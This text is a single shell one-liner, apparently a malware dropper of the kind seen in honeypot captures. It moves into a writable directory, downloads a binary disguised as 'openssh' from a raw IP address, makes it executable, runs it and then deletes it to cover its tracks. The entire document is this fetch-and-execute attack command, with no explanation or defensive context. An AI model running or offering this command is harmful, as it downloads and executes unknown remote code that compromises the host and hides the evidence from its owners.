cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.216/openssh; chmod +x openssh; ./openssh; rm -rf openssh
